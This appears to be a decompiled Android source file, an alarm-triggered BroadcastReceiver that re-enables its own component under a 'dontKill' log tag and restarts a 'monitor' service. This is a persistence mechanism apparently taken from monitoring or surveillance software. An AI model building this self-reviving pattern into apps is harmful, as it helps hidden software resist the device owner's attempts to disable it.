package com.network.location;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.HandlerThread;
import com.network.android.android.monitor.AppService;
import com.network.android.c.a.a;
import java.util.Date;

public class OnAlarmReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    private static Handler f159a;

    static {
        HandlerThread handlerThread = new HandlerThread("MainApp");
        handlerThread.start();
        f159a = new Handler(handlerThread.getLooper());
    }

    public void onReceive(Context context, Intent intent) {
        a.a("OnAlarmReceiver onReceive: " + new Date().toGMTString() + " action: " + intent.getAction());
        try {
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, OnAlarmReceiver.class), 1, 1);
        } catch (Throwable th) {
            a.a("dontKill - " + th.getMessage(), th);
        }
        try {
            context.startService(new Intent(context, AppService.class));
        } catch (Throwable th2) {
            a.a("Location OnAlarmReceiver - " + th2.getMessage(), th2);
        }
    }
}
